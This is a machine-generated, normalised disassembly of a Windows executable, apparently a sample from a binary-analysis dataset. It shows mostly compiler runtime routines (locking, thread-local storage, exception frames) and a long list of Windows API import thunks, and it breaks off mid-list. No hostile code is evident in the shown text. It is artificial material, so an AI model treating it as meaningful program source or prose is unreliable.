sub_44e914
push sub_44e8c0
call sub_44e6fc
pop ecx
retn
sub_44e994
push rw-data
call LoadLibraryA
cmp eax [ rw-data ]
je r-xdata
retn
push rw-data
call sub_454630
pop ecx
sub_44eb64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
call [ rw-data ]
sub_44eb78
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
call [ rw-data ]
pop ebp
retn
sub_44ebcc
call [ rw-data ]
retn
sub_44ebf4
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call [ rw-data ]
add esp 0x8
pop ebp
retn
sub_44ec54
push ebp
mov ebp esp
push 0x1
call sub_44ec0c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ecx
pop ebp
retn
sub_44ec6c
push ebp
mov ebp esp
push 0x1
call sub_44ec0c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ecx
pop ebp
retn
sub_44eca4
retn
sub_44eca8
mov [ rw-data ] 0x1
retn
sub_44ecb4
cmp [ rw-data ] 0x0
je r-xdata
retn
call [ rw-data ]
sub_44ecc4
retn
sub_44ecc8
xor eax eax
retn
sub_44ed5c
retn
sub_44eda0
retn
sub_44f358
push ebp
mov ebp esp
xor edx edx
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
inc edx
add eax 0x2
mov eax edx
pop ebp
retn
sub_44f3e9
mov [ fs : 0x0 ] eax
retn
sub_44fe4c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] sub_44fe74
retn
mov [ rw-data ] sub_44fec4
sub_44fea8
call sub_456701
call sub_45465c
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fec4
call sub_401140
and [ eax + 0x14 ] 0xfffffffd
mov eax sub_44fec4
cmp eax [ rw-data ]
je r-xdata
call sub_44ff18
retn
call [ rw-data ]
sub_44feec
push rw-data
push 0x0
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov [ rw-data ] ___CPPdebugHook
sub_450010
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
call sub_401140
add eax 0x2c
mov [ rw-data ] eax
mov [ ebx ] 0x82727349
mov [ ebx + 0x4 ] rw-data
pop ebx
pop ebp
retn
sub_450038
push ebp
mov ebp esp
mov eax 0x1
pop ebp
retn
sub_450134
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] sub_450044
push eax
call sub_4501c0
pop ecx
pop ebp
retn
sub_450150
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_4501d5
pop ecx
pop ebp
retn
sub_450160
push ebp
mov ebp esp
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ rw-data ] edx
pop ebp
retn
sub_450174
mov [ rw-data ] sub_450038
retn
sub_450180
mov [ rw-data ] sub_450038
mov [ rw-data ] sub_450038
retn
sub_450198
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call sub_450150
pop ecx
sub_4501ac
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call sub_450134
pop ecx
sub_4501c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ fs : 0x0 ]
mov [ eax ] ecx
mov [ fs : 0x0 ] eax
pop ebp
retn
sub_450201
jmp RtlUnwind
sub_450208
mov esp ebx
mov ebp ecx
jmp eax
sub_45020e
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push eax
call RtlUnwind
pop edi
pop esi
pop ebx
retn
sub_450223
push ebp
mov ebp ecx
call [ ebx ]
pop ebp
retn
sub_45025c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call GetFileType
cmp eax 0x2
sete al
and eax 0x1
pop ebp
retn
sub_45042c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov [ eax ] 0x0
sub_4504cc
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4502f8
add esp 0xc
pop ebp
retn
sub_45065c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_45066c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov eax [ eax ]
mov [ rw-data ] eax
sub_450680
mov eax [ rw-data ]
push eax
call sub_4558c8
pop ecx
retn
sub_450690
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
retn
push eax
call sub_44ebe4
pop ecx
xor edx edx
mov [ rw-data ] edx
sub_4506b4
mov eax [ rw-data ]
push eax
call sub_4558d8
pop ecx
retn
sub_450848
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
jae r-xdata
pop ebp
retn
xor edx edx
mov [ eax * 4 + rw-data ] edx
sub_450ac4
push ebx
call GetLastError
mov ebx eax
and ebx 0xffff
mov eax ebx
and eax 0xffff
push eax
call sub_450a78
pop ecx
mov eax ebx
pop ebx
retn
sub_450ae4
call GetLastError
and eax 0xffff
push eax
call sub_450a78
pop ecx
retn
sub_450fdc
mov eax [ rw-data ]
push eax
call sub_4558c8
pop ecx
retn
sub_450fec
mov eax [ rw-data ]
push eax
call sub_4558d8
pop ecx
retn
sub_4510a0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
retn
push eax
call sub_44ebe4
pop ecx
xor edx edx
mov [ rw-data ] edx
sub_451b88
push ebp
mov ebp esp
push 0x104
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451ba0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x80
setb al
and eax 0x1
pop ebp
retn
sub_451bb4
push ebp
mov ebp esp
push 0x100
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451bcc
push ebp
mov ebp esp
push 0x20
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451be0
push ebp
mov ebp esp
push 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451bf4
push ebp
mov ebp esp
push 0x194
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451c0c
push ebp
mov ebp esp
push 0x2
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451c20
push ebp
mov ebp esp
push 0x1d4
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451c38
push ebp
mov ebp esp
push 0x10
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451c4c
push ebp
mov ebp esp
push 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451c60
push ebp
mov ebp esp
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451c74
push ebp
mov ebp esp
push 0x80
mov eax [ ebp + 0x8 ]
push eax
call sub_451d90
add esp 0x8
pop ebp
retn
sub_451c8c
push ebp
mov ebp esp
push 0x104
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_451ca4
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
cmp eax 0x80
setb al
and eax 0x1
pop ebp
retn
sub_451cb8
push ebp
mov ebp esp
push 0x100
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_451cd0
push ebp
mov ebp esp
push 0x20
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_451ce4
push ebp
mov ebp esp
push 0x4
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_451cf8
push ebp
mov ebp esp
push 0x194
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_451d10
push ebp
mov ebp esp
push 0x2
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_451d24
push ebp
mov ebp esp
push 0x1d4
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_451d3c
push ebp
mov ebp esp
push 0x10
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_451d50
push ebp
mov ebp esp
push 0x8
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_451d64
push ebp
mov ebp esp
push 0x1
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_451d78
push ebp
mov ebp esp
push 0x80
movzx eax [ ebp + 0x8 ]
push eax
call sub_451dd4
add esp 0x8
pop ebp
retn
sub_452674
push ebp
mov ebp esp
lea esp [ ebp - 0x2 ]
fnstsw [ ebp - 0x2 ]
fnclex
movzx eax [ ebp - 0x2 ]
mov esp ebp
pop ebp
retn
j_sub_4526d0
jmp [ rw-data ]
j_sub_4526d0#2
jmp [ rw-data ]
sub_4526d0
push rw-data
call sub_454630
pop ecx
retn
sub_4526dc
push rw-data
call sub_454630
pop ecx
retn
sub_4526e8
push rw-data
call sub_454630
pop ecx
retn
sub_4526f4
push rw-data
call sub_454630
pop ecx
retn
sub_452700
fninit
push 0x1fff
push [ rw-data ]
call sub_452688
add esp 0x8
retn
sub_45276c
mov eax [ esp + 0x4 ]
fld [ eax ]
fxam
xor eax eax
fwait
fnstsw ax
fstp st0
fwait
retn
sub_452a38
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ rw-data ] eax
mov [ rw-data ] edx
pop ebp
retn
sub_452d74
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
add eax 0x8
add eax 0xc
jmp r-xdata
pop ebp
retn
sub_452d8c
mov [ rw-data ] sub_452aec
mov [ rw-data ] sub_452d74
retn
sub_4530a8
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
add eax 0x8
add eax 0xc
jmp r-xdata
pop ebp
retn
sub_4530c0
mov [ rw-data ] sub_452df0
mov [ rw-data ] sub_4530a8
retn
sub_4535b8
mov [ rw-data ] sub_4530d8
mov [ rw-data ] sub_453538
retn
sub_453aac
mov [ rw-data ] sub_4535d0
mov [ rw-data ] sub_453a2c
retn
sub_45421c
mov eax [ rw-data ]
retn
sub_454224
call GetACP
push eax
call sub_4540f8
pop ecx
retn
sub_4544ac
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov [ eax ] 0x1
xor eax eax
pop ebp
retn 0x8
sub_454620
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_454504
pop ecx
pop ebp
retn
sub_454648
push rw-data
call sub_454504
pop ecx
push 0x3
call sub_4546f4
pop ecx
retn
sub_45465c
push 0x16
call sub_455220
pop ecx
call sub_454648
retn
sub_45466c
retn
sub_4546dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push 0x0
push 0x0
call sub_454670
add esp 0xc
pop ebp
retn
sub_4546f4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push 0x0
push 0x1
call sub_454670
add esp 0xc
pop ebp
retn
sub_45470c
push 0x0
push 0x1
push 0x0
call sub_454670
add esp 0xc
retn
sub_45471c
push 0x0
push 0x1
push 0x1
call sub_454670
add esp 0xc
retn
sub_45472c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ eax ]
mov [ rw-data ] edx
mov eax [ ecx ]
mov [ rw-data ] eax
pop ebp
retn
sub_454748
push ebp
mov ebp esp
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ ebp + 0xc ]
add esp 0x8
pop ebp
retn
sub_45475c
push ebp
mov ebp esp
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ ebp + 0xc ]
add esp 0x8
pop ebp
retn
sub_454770
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ rw-data ] eax
mov [ rw-data ] edx
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
mov [ rw-data ] ecx
mov [ rw-data ] eax
pop ebp
retn
sub_454a5c
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call sub_44ebe4
pop ecx
xor edx edx
mov [ rw-data ] edx
sub_454c80
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call sub_44ebe4
pop ecx
xor edx edx
mov [ rw-data ] edx
sub_454d4c
mov eax [ rw-data ]
push eax
call sub_44ebe4
pop ecx
retn
sub_454d5c
mov eax [ rw-data ]
push eax
call sub_4558c8
pop ecx
retn
sub_454d6c
mov eax [ rw-data ]
push eax
call sub_4558d8
pop ecx
retn
sub_455148
push ebp
mov ebp esp
mov eax 0x2
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push eax
call sub_455220
pop ecx
mov eax 0x1
pop ebp
retn 0x4
add eax 0x13
sub_4552b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call ExitProcess
sub_4552c4
xor eax eax
retn
sub_4552c8
xor eax eax
retn
sub_45540c
mov eax [ rw-data ]
push eax
call sub_4558c8
pop ecx
retn
sub_45541c
mov eax [ rw-data ]
push eax
call sub_4558d8
pop ecx
retn
sub_45542c
push rw-data
push rw-data
call sub_455864
add esp 0x8
retn
sub_4555c4
add esp 0xffffffbc
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax 0xa
movzx eax [ esp + 0x30 ]
jmp r-xdata
add esp 0x44
retn
sub_4555e4
call sub_401140
mov eax [ eax + 0xb0 ]
retn
sub_4555f0
call sub_401140
mov eax [ eax + 0xac ]
retn
sub_45564c
call TlsAlloc
retn
sub_455654
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call TlsFree
pop ebp
retn 0x4
sub_455664
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call TlsGetValue
pop ebp
retn 0x4
sub_455674
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call TlsSetValue
pop ebp
retn 0x8
sub_455688
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_455690
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_455698
xor eax eax
retn
sub_45569c
push ebx
call sub_401140
mov ebx [ eax + 0xb0 ]
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_4556c4
mov ebx eax
call sub_401140
mov [ eax + 0xb0 ] ebx
sub_4557a0
push rw-data
push rw-data
call sub_455864
add esp 0x8
retn
sub_4558c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call EnterCriticalSection
pop ebp
retn
sub_4558d8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call LeaveCriticalSection
pop ebp
retn
sub_455924
push rw-data
call InitializeCriticalSection
mov [ rw-data ] 0x1
retn
sub_45593c
push rw-data
push 0x0
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov [ rw-data ] ___CPPdebugHook
sub_455967
mov esp ebx
mov ebp ecx
jmp eax
sub_45682d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456d98
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_456c2d
add esp 0x8
pop ebp
retn
j_sub_434478
jmp sub_434478
j_sub_41fd60
jmp sub_41fd60
sub_459770
push ebp
mov ebp esp
call sub_401258
pop ebp
retn
sub_459838
push edx
push ecx
call [ eax - 0xc ]
pop ecx
pop edx
retn
sub_459840
mov edx [ eax ]
jmp [ edx - 0x8 ]
sub_459845
push eax
mov edx [ eax ]
call [ edx - 0x1c ]
pop eax
retn
sub_45984d
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_45985c
sub esp 0x8
fld [ esp + 0xc ]
fistp [ esp ]
pop eax
pop edx
retn
sub_4599b4
call sub_464518
retn
sub_4599bc
call sub_4644ec
retn
sub_45aa3c
push edx
call sub_46a2f8
pop ecx
retn
sub_45aa44
push edx
call sub_46a308
pop ecx
retn
sub_45aa4c
push edx
call sub_46a2f8
pop ecx
retn
sub_45aa54
push edx
call sub_46a308
pop ecx
retn
sub_45aa5c
push ebp
mov ebp esp
mov eax ecx
pop ebp
retn 0x4
sub_45aa68
mov edx [ eax ]
mov [ edx + 0x14 ] 0x30
mov ecx [ eax ]
call [ ecx ]
retn
sub_45aa78
xor eax eax
retn
sub_45aa7c
retn
sub_45aea8
mov eax [ eax + 0x1a6 ]
mov [ eax ] sub_45aeb8
retn
sub_45afe8
mov eax [ eax + 0x14 ]
mov [ eax + 0x24 ] 0x1
retn
sub_45b090
retn
sub_45bb1c
push ebx
cmp [ eax + 0x50 ] 0x0
mov ebx [ eax + 0x196 ]
je r-xdata
inc [ ebx + 0xc ]
pop ebx
retn
mov edx [ eax + 0x1be ]
call [ edx + 0x8 ]
sub_45d4f0
mov edx [ eax + 0x1b6 ]
xor ecx ecx
mov [ edx + 0x24 ] ecx
mov eax [ eax + 0x70 ]
mov [ edx + 0x2c ] eax
retn
sub_45de00
retn
sub_45eb80
retn
sub_45eb84
mov edx [ eax ]
mov [ edx + 0x14 ] 0x2d
mov ecx [ eax ]
call [ ecx ]
retn
sub_45fcc0
push ebx
mov ebx [ eax + 0x1be ]
mov edx [ ebx + 0x10 ]
mov [ eax + 0x84 ] edx
mov edx [ ebx + 0x14 ]
call sub_45f330
mov [ ebx + 0x1c ] 0x1
pop ebx
retn
sub_45fce4
retn
sub_45fe00
mov eax [ eax + 0x1be ]
mov [ eax + 0x1c ] 0x1
retn
sub_460654
xor edx edx
mov [ eax + 0x90 ] edx
call sub_460608
retn
sub_4608f0
xor eax eax
retn
sub_461c84
mov edx [ eax + 0x1b6 ]
mov ecx [ eax + 0x12a ]
mov [ edx + 0x5c ] ecx
mov eax [ eax + 0x70 ]
mov [ edx + 0x60 ] eax
retn
sub_461d9c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_461da8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
pop ebp
retn 0x4
sub_46424c
pop ebx
retn
sub_4644dc
shl ecx 0x7
push ecx
push eax
push edx
call sub_46a330
add esp 0xc
retn
sub_464538
push ebx
mov ecx 0x84
xor edx edx
mov ebx [ eax + 0x4 ]
call [ ebx ]
xor edx edx
mov [ eax + 0x80 ] edx
pop ebx
retn
sub_46527c
call sub_464518
retn
sub_465284
call sub_4644ec
retn
sub_46568c
retn
sub_465b74
mov edx 0xd9
call sub_465488
retn
sub_467a7c
retn
sub_467ccc
retn
sub_468e18
push ebx
mov ebx eax
mov ecx 0x7
mov edx 0x7f
mov eax ebx
call sub_468d7c
xor eax eax
xor edx edx
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
pop ebx
retn
sub_46a2f8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_44ba5c
pop ebp
retn
sub_46a308
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_44ba74
pop ebp
retn
sub_46a318
push ebp
mov ebp esp
xor ecx ecx
mov cl [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
call sub_44bd90
pop ebp
retn
sub_46a330
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
call sub_44bbe8
pop ebp
retn
sub_46a344
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0xc ]
imul ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ebp
retn
sub_46a360
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0xc ]
imul ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ebp
retn
sub_46a37c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn
sub_46a3f0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
pop ebx
retn
j_sub_44c770#9
jmp sub_44c770
sub_46a474
pop ebx
mov esp ebp
pop ebp
retn
sub_46a47c
retn
sub_46a480
retn
sub_46a484
retn
sub_46a488
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x70 ] ecx
xor eax eax
mov [ edx + 0x14 ] eax
retn
sub_46a4c8
retn
sub_46a730
push ebx
mov ebx eax
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
pop ebx
retn
lea eax [ ebx + 0xa8 ]
call sub_464518
xor eax eax
mov [ ebx + 0xa8 ] eax
j_sub_44c4bc
jmp sub_44c4bc
j_sub_44c770#8
jmp sub_44c770
sub_46a9e8
call sub_411638
retn
sub_46acfb
jmp sub_44c770
sub_46ad02
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ad1f
mov eax [ ebp - 0x10 ]
call sub_44c070
retn
sub_46ad18
jmp sub_44c770
j_sub_44c5e8#2
jmp sub_44c5e8
j_sub_44c770#7
jmp sub_44c770
sub_46add8
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call sub_44c070
xor eax eax
mov [ ebx + 0x24 ] eax
pop ebx
retn
j_sub_44c770#6
jmp sub_44c770
j_sub_44c5e8
jmp sub_44c5e8
j_sub_44c770#5
jmp sub_44c770
sub_46b410
mov edx [ eax + 0x20 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
retn
call sub_46a9f0
sub_46b464
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call sub_44c070
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebx + 0x24 ] eax
pop ebx
retn
j_sub_44c770#4
jmp sub_44c770
j_sub_44c770#3
jmp sub_44c770
sub_46b6a9
pop ecx
pop ebp
retn
j_sub_44c770#2
jmp sub_44c770
sub_46b749
pop ecx
pop ebp
retn
sub_46d04f
jmp sub_44c770
sub_46d056
pop ebp
retn
j_sub_44c770
jmp sub_44c770
sub_46d0e7
pop ecx
pop ecx
pop ebp
retn
sub_46d145
jmp sub_44c770
sub_46d14c
pop ebp
retn
sub_46d150
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateEventA
jmp [ CreateEventA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
EnumCalendarInfoA
jmp [ EnumCalendarInfoA@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetEnvironmentStrings
jmp [ GetEnvironmentStrings@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFileType
jmp [ GetFileType@IAT ]
GetLastError
jmp [ GetLastError@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
GetStringTypeW
jmp [ GetStringTypeW@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetThreadLocale
jmp [ GetThreadLocale@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAddAtomA
jmp [ GlobalAddAtomA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalDeleteAtom
jmp [ GlobalDeleteAtom@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
InitializeCriticalSection
jmp [ InitializeCriticalSection@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadLibraryExA
jmp [ LoadLibraryExA@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
LocalFree
jmp [ LocalFree@IAT ]
LockResource
jmp [ LockResource@IAT ]
MulDiv
jmp [ MulDiv@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
SetConsoleCtrlHandler
jmp [ SetConsoleCtrlHandler@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetErrorMode
jmp [ SetErrorMode@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetHandleCount
jmp [ SetHandleCount@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
Sleep
jmp [ Sleep@IAT ]
TlsAlloc
jmp [ TlsAlloc@IAT ]
TlsFree
jmp [ TlsFree@IAT ]
TlsGetValue
jmp [ TlsGetValue@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
lstrcpynA
jmp [ lstrcpynA@IAT ]
lstrlenA
jmp [ lstrlenA@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_Draw
jmp [ ImageList_Draw@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
